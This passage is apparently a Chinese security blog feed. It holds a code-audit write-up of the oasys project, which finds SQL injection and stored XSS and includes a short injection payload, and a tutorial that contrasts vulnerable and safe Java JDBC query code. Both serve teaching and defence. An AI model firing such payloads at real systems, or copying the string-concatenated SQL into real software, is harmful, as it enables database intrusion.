8d76512aa18d9d35d5ca22912a369c4a952864590c71d1c6aa9d53f44e78fdf6e7d5d094da30552d627525c6f83777c1c2f1734ba2912dce4fde8d846e995ae0282ea2504513a7d6b601dd1fe052fb1c0574fa17ebebdab838202b087e16c8a6f7fecc9eb2fe6555ab44793018d62ea54a52aec820f157c73c64dde46e51ba94542826b497a8e4d37a425dc45d95ecd6423bdb3a96233137bbdc0558d68c5b30bbf590bce2b8a4704c92a2a623ef3e5b704821bc7b1c06e9af9e27bc02cb250ce90f9a2d511b38eeee5a68ed11d17b53f0a8dd465d04b8d2d4d04177722b52f362873aacadad5a862325fd3085ee19a97d9a172f13f933c9215e17c87656e73066e6ed8aa11e6a360bc7b242ac4e38c609d87cf40304a9bdee4e3969e0528e77dfea3efc635ae11e12291190b9f1cb0f4172305049a8c931c33f78fc3c9e16b4e68c60cc59139ffd50877b6ecc43170fbfa1f3572a50afab4395b2f5fc58c26b185f5b705f4c2ad1a56791d9d7cd7af138cb3665c8450674b9d32f9f7394b176a7683b70c1a4445b803091aed504ede33394955677fabc47acfd4134368228fddba2127db8b8505475ca0bfbcf400757b3ab9a735a72cbec49d74daf9c19024cdab97f4b0607f289e374124dceb74f183393627802d22ea042c54ca3c3c646a051e51362fae417665cc092f395b2438d4ae5558f3225b557d62c36466a3c50fdf2b12c2d2396369d9f3088a369b6c81af775c199a8fdfe71a836250fca88332d2be37c8d483025883b29d94bda900a07ab2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Please input password.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">请输入密码查看文章.</summary>
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="codeql" scheme="https://jaspersec.top/tags/codeql/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="need_password" scheme="https://jaspersec.top/tags/need-password/"/>
    
  </entry>
  
  <entry>
    <title>oasys 代码审计</title>
    <link href="https://jaspersec.top/posts/3302810806.html"/>
    <id>https://jaspersec.top/posts/3302810806.html</id>
    <published>2025-03-18T19:47:00.000Z</published>
    <updated>2025-04-02T12:08:33.317Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xmcve.com/">星盟安全团队</a>长期招新中~ 我们的目标是星辰大海！ </p><ul><li>简历格式：ID、联系方式、掌握技术、比赛情况</li><li>简历投递邮箱： <a href="mailto:&#x78;&#109;&#99;&#118;&#x65;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;">&#x78;&#109;&#99;&#118;&#x65;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;</a></li><li>联系QQ：1609410364</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>oasys 这个项目适合新手代审入门，尝试了下 <code>codeql + 人工</code> 的审计的思路，最后效果还是不错的。<br>项目地址： <a href="https://github.com/misstt123/oasys">https://github.com/misstt123/oasys</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>标准maven项目，README.md有教程，不多赘述。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/a657ce23fd0a0a25937d89a9c59308bb.png"></p><h3 id="codeql环境"><a href="#codeql环境" class="headerlink" title="codeql环境"></a>codeql环境</h3><p>标准 mvn 项目，一行命令搞定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create oasys-database --language=java --command=&quot;mvn clean package -Dmaven.test.skip=true&quot; --source-root ./ --ram=32000 --threads=4 --overwrite</span><br></pre></td></tr></table></figure><p>直接使用自带的分析脚本， codeql analyse 一键分析：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 直接指定查询脚本根目录，codeql会自动递归查找</span></span></span><br><span class="line">codeql database analyze .\oasys-master D:\Security\tools\codeql\codeql-cli\qlpacks\codeql\java-queries\1.2.0\experimental\Security\CWE --format=csv --output=oasys_scan_result.csv --ram=32000 --threads=4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 直接指定查询套件，套件封装好了去查哪些脚本</span></span></span><br><span class="line">codeql database analyze .\oasys-master\ D:\Security\tools\codeql\codeql-cli\qlpacks\codeql\java-queries\1.2.0\codeql-suites\java-security-experimental.qls --format=csv --output=oasys_scan_result.csv --ram=32000 --threads=4</span><br></pre></td></tr></table></figure><p>注意：如果不特别指定查询脚本，而默认使用 <code>java-code-scanning.qls</code>效果差，得用<code>java-security-experimental.qls</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3a000c25213a8473ae5e8d60d1560966.png"><br>可以看到，查出来了 SQL注入、log注入、文件名注入、CSRF等等，codeql当作漏扫还是挺好用的哈哈 XD<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c83477f637250ea16a1ccc5063672c4d.png"></p><h2 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h2><p>README.md 里写了使用到的组件， 可以看到常见的漏洞组件有：freemaker、fastjson、mybatis<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/e351ded1731c386cd8524444615c13b6.png"></p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>漏洞函数：</p><ol><li>parse</li><li>parseObject<br><code>parse</code> 和 <code>parseObject</code>，这边我用 codeql 搜索、全局搜索都是没有写对应逻辑的，遂放弃。<figure class="highlight q"><figcaption><span>title:"查找 fastjson 漏洞函数"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">class Sink extends Method &#123; </span><br><span class="line">    Sink() &#123;</span><br><span class="line">        this.getName() = <span class="string">&quot;parseObject&quot;</span></span><br><span class="line">        <span class="built_in">or</span> this.getName() = <span class="string">&quot;parse&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> Sink sink</span><br><span class="line"><span class="keyword">select</span> sink,sink.getQualifiedName(),sink.getFile().getAbsolutePath()</span><br></pre></td></tr></table></figure></li></ol><h3 id="freemarker"><a href="#freemarker" class="headerlink" title="freemarker"></a>freemarker</h3><p>freemarker 低版本情况下，需要能够上传恶意模板文件，或者修改原有模板文件实现 RCE 或者任意文件读取，但整个项目并没有发现模板修改或者文件上传点，故放弃。</p><h3 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h3><p>查看 pom 依赖发现并没有 log4j2-core 这个jar包，项目使用的是 slf4j，虽然log参数可控，但是无法利用。</p><h2 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h2><h3 id="informListPaging-SQLI"><a href="#informListPaging-SQLI" class="headerlink" title="informListPaging - SQLI"></a>informListPaging - SQLI</h3><p>全局搜索 <code>$&#123;</code>，<code>notice-mapper.xml</code> 里发现了 like 语句的动态拼接，显然是漏洞点<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c410eab4aa21823ee0906ed02259266b.png"><br>回溯代码逻辑，参数是否用户可控，最终找到<code>cn.gson.oasys.controller.inform.InformController#informListPaging</code>，basKey 可控且为字符串类型，显然可控。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ed647c42680ec76cd9e5bab29895cf16.png"><br>构造 payload 实现 like SQL注入<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1167473d2e252d57da9347b5ec64b021.png"><br><strong>防御思路</strong>：like 后的参数改为使用 <code>concat(&quot;%&quot;,#&#123;xxx&#125;,&quot;%&quot;) </code>的形式，不要使用 <code>$&#123;&#125;</code> 动态拼接用户参数。</p><h3 id="outaddresspaging-SQLI"><a href="#outaddresspaging-SQLI" class="headerlink" title="outaddresspaging - SQLI"></a>outaddresspaging - SQLI</h3><p>和上面的思路一样，全局搜索后在 <code>address-mapper.xml</code> 发现在 like 后面存在滥用 <code>$&#123;&#125;</code> 的情况<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5534556372843507a14445ea2d6138fd.png"><br>根据Mybatis映射规则找到对应路由<code>cn.gson.oasys.controller.address.AddrController#outAddress</code>，发现参数可控：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1a4eab04dd88aceae9eaee93f8662122.png"><br>然后就是尝试构造payload利用，payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alph<span class="operator">=</span>Jasper<span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27; like &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/45ffdf6b0903fbb8056fa9757dba0e9d.png"><br>Jasper 的叨叨念：在大型项目里（当然不是说这个），有时很难通过代码完整地反推到路由和传参来进行利用，这时可以先找功能点，然后从用户的角度去到处点点 Fuzz 接口，再到yakit里搜索对应路由关键字找到路由<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1e6b604fd8dc8db7b3c30a54f5cb6c48.png"><br><strong>修复方案</strong>：like 后的参数改为使用 <code>concat(&quot;%&quot;,#&#123;xxx&#125;,&quot;%&quot;) </code>的形式，不要使用 <code>$&#123;&#125;</code> 动态拼接用户参数。</p><h3 id="讨论区-存储XSS"><a href="#讨论区-存储XSS" class="headerlink" title="讨论区 - 存储XSS"></a>讨论区 - 存储XSS</h3><p>普通用户和管理员均可发表讨论，插入任意js代码实现存储xss。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/6cbb038ab574080ec2888a520f4446e3.png"><br>任意用户在讨论区点击查看时触发<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/70f291c36a1c55f131edb5a75da4c71f.png"><br><strong>防御方式</strong>：</p><ol><li>对用户的输入的特殊字符做实体编码</li><li>引入 CSP</li></ol><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>这个是 codeql 找到的，CSRF 逻辑洞我就没去测了，感兴趣的师傅可以试试。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这种个人作者开发的小项目漏洞还是比较明显的，人工审计很快就能找到漏洞点，同时使用 codeql 的自带的 suites 也具备一定的漏洞检出能力。<br>思考：对于这种小项目，codeql 的优势似乎没有体现出来，另外，我这里把它当作一个静态漏扫工具去使用了，这显然不是它的全部实力</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://docs.github.com/zh/code-security/code-scanning/managing-your-code-scanning-configuration/codeql-query-suites">https://docs.github.com/zh/code-security/code-scanning/managing-your-code-scanning-configuration/codeql-query-suites</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://xmcve.com/&quot;&gt;星盟安全团队&lt;/a&gt;长期招新中~ 我们的目标是星辰大海！ &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;简历格式：ID、联系方式、掌握技术、比赛情况&lt;/li&gt;
&lt;li&gt;简历投递邮箱： &lt;a href=&quot;mailto:&amp;#x78;&amp;#1</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java基础漏洞 - SQLI</title>
    <link href="https://jaspersec.top/posts/3957940821.html"/>
    <id>https://jaspersec.top/posts/3957940821.html</id>
    <published>2025-03-16T19:47:00.000Z</published>
    <updated>2025-03-31T22:09:47.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要对 Java 下 SQLI 的漏洞成因、防御思路做了分析总结，方便理清代码审计时的思路，漏洞样例代码参考自 <a href="https://github.com/j3ers3/Hello-Java-Sec">Hello-Java-Sec</a> 的sql 注入部分。</p><h2 id="JDBC-漏洞点"><a href="#JDBC-漏洞点" class="headerlink" title="JDBC 漏洞点"></a>JDBC 漏洞点</h2><p>JDBC 是相对较老的数据库操作方式了，印象中我在本科课程还用 eclipse 开发过小网页，其中分页查询数据的功能点用到了它。简单来说，JDBC 提供了一套调用接口，使得开发人员可以在Java代码里写SQL，并传入数据库执行。</p><h3 id="动态拼接参数"><a href="#动态拼接参数" class="headerlink" title="动态拼接参数"></a>动态拼接参数</h3><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>动态拼接参数一般是使用 <code>java.sql.Statement</code> 类进行 SQL 查询时，sql 语句动态拼接用户传参导致的注入漏洞。</p><p>例如下面代码中，id 参数直接做了字符串拼接，显然是可以直接注入的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;vul: JDBC语句拼接&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/vul1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">vul1</span><span class="params">(String id)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &#x27;&quot;</span> + id + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;[vul] 执行SQL语句： &#123;&#125;&quot;</span>, sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">res_pass</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">result.append(String.format(<span class="string">&quot;查询结果 %s: %s&quot;</span>, res_name, res_pass));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br><span class="line"><span class="keyword">return</span> result.toString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// 输出错误，用于报错注入</span></span><br><span class="line"><span class="keyword">return</span> e.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进一步，使用字符串动态拼接可实现不同关键字的注入，如 like注入、in注入和 order by 注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql_like</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id like &#x27;%&quot;</span> + id + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql_order</span> <span class="operator">=</span> <span class="string">&quot;select * from users order by &quot;</span> + column_name;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql_in</span> <span class="operator">=</span> <span class="string">&quot;delete from users where id in(&quot;</span> + del_ids +<span class="string">&quot;);&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql_xxx);</span><br></pre></td></tr></table></figure><h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><ol><li>预编译SQL</li><li>黑白名单</li><li>参数类型强转</li></ol><p>使用<code>java.sql.PreparedStatement</code>预编译SQL语句可以解决动态拼接的问题，简单来说就是使用占位符代替直接传入的参数，然后调用setter去做赋值，实现了sql 注入的防御。使用预编译的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;safe：JDBC预编译&quot;, notes = &quot;采用预编译的方法，使用?占位，也叫参数化的SQL&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/safe1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">safe1</span><span class="params">(String id)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = ?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">st.setString(<span class="number">1</span>, id);</span><br><span class="line">log.info(<span class="string">&quot;[safe] 执行SQL语句： &#123;&#125;&quot;</span>, st);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">res_pass</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;查询结果%n %s: %s%n&quot;</span>, res_name, res_pass);</span><br><span class="line">result.append(info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rs.close();</span><br><span class="line">st.close();</span><br><span class="line">conn.close();</span><br><span class="line"><span class="keyword">return</span> result.toString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">return</span> e.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：并不是使用了预编译SQL就是绝对安全的，下一小节就指出了预编译使用不当、无法使用预编译而导致的漏洞。</p><p>类似的防御策略还有：黑白名单、类型强转、第三方安全编码组件等，这里以类型强转为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;safe：强制数据类型&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/safe4&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">safe4</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">    <span class="type">DriverManagerDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DriverManagerDataSource</span>();</span><br><span class="line">    dataSource.setDriverClassName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    dataSource.setUrl(db_url);</span><br><span class="line">    dataSource.setUsername(db_user);</span><br><span class="line">    dataSource.setPassword(db_pass);</span><br><span class="line"></span><br><span class="line">    <span class="type">JdbcTemplate</span> <span class="variable">jdbctemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(dataSource);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql_vul</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &quot;</span> + id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jdbctemplate.queryForMap(sql_vul);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预编译未使用占位符"><a href="#预编译未使用占位符" class="headerlink" title="预编译未使用占位符"></a>预编译未使用占位符</h3><h4 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>预编译起作用的前提是正确使用 PreparedStatement ，如果仅调用查询，而不使用占位符进行参数拼接，本质上还是会导致动态参数拼接的问题，从而导致注入。</p><p>例如下面代码虽然用到了预编译的函数，但是并未使用占位符，从而导致注入漏洞。这个问题多是因为开发人员的粗心大意导致的，而在如今的AI辅助编程时代，类似的错误会越来越少。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;vul：JDBC预编译拼接&quot;, notes = &quot;采用预编译的方法，但没使用?占位，此时进行预编译也无法阻止SQL注入&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/vul2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">vul2</span><span class="params">(String id)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &quot;</span> + id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;[vul] 执行SQL语句： &#123;&#125;&quot;</span>, sql);</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">res_pass</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;查询结果%n %s: %s%n&quot;</span>, res_name, res_pass);</span><br><span class="line">result.append(info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rs.close();</span><br><span class="line">st.close();</span><br><span class="line">conn.close();</span><br><span class="line"><span class="keyword">return</span> result.toString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">return</span> e.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="防御思路-1"><a href="#防御思路-1" class="headerlink" title="防御思路"></a>防御思路</h4><p>对于这种代码编写错误，要规范安全开发流程，在上线前要做统一的代码审查，避免类似的问题。</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><h4 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>这个漏洞比较有意思，由于 PreparedStatement 预编译的函数会把传参转换成字符串，所以会出现下面的情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## 正常语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id</span><br><span class="line">## 预编译转义后</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> &quot;id&quot;</span><br></pre></td></tr></table></figure><p>“id”不被识别为列名，进而导致排序失效，所以编写包含排序的语句时，只能通过拼接的方式，而如果没对参数进行严格过滤，就容易造成SQL注入。漏洞代码在动态参数拼接那一节写过了，伪代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql_order</span> <span class="operator">=</span> <span class="string">&quot;select * from users order by &quot;</span> + id;</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql_order);</span><br></pre></td></tr></table></figure><h4 id="防御思路-2"><a href="#防御思路-2" class="headerlink" title="防御思路"></a>防御思路</h4><p>由于无法使用预编译，所以需要对用户传参做校验，推荐使用白名单过滤，指定传参必须为列名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 